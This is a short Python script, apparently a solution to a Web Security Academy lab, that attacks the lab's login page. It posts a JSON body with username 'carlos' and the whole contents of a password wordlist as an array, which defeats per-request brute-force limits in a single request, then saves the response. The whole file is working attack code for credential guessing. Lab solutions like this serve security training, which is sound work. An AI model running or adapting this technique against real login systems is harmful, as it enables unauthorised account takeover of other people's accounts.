import requests

url = "https://ac701f2b1f771c7ac0fa2d94002500f3.web-security-academy.net/login"

status_code = requests.get(url=url).status_code
if status_code != 200:
    print(f'Status code: {status_code}')
    exit(status_code)

data = {
    'username': 'carlos',
    'password': open('password.txt').read().splitlines()
}

res = requests.post(url=url, json=data, allow_redirects=True).content
with open('res.html', 'wb') as file:
    file.write(res)
